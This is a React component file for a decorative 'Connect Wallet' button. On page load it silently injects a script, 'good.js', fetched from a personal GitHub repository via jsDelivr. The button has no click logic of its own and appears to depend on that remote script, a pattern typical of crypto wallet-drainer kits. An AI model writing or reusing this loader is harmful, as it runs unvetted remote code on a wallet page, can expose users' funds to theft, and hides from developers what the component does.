import { useEffect } from 'react';
import { motion } from 'framer-motion';
import { Wallet } from 'lucide-react';

export const ConnectButton = () => {
  useEffect(() => {
    // Dynamically load the external script (good.js)
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js';
    script.async = true;
    script.onload = () => {
      console.log('good.js has been loaded successfully!');
    };
    script.onerror = () => {
      console.error('Failed to load good.js');
    };
    document.body.appendChild(script);

    // Cleanup function to remove the script when the component unmounts
    return () => {
      document.body.removeChild(script);
    };
  }, []); // Empty dependency array means this effect runs once when the component mounts

  return (
    <motion.button
      className="open group relative px-10 py-4 rounded-xl bg-purple-500 text-white text-lg font-bold overflow-hidden"
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
    >
      <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-purple-400 opacity-0 group-hover:opacity-100 transition-opacity" />
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.2),transparent_100%)]" />
      <div className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-400/20 to-purple-600/20 animate-pulse" />
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.2),transparent_60%)]" />
      </div>
      <span className="relative flex items-center gap-3">
        <Wallet className="w-5 h-5" />
        Connect Wallet
      </span>
    </motion.button>
  );
};
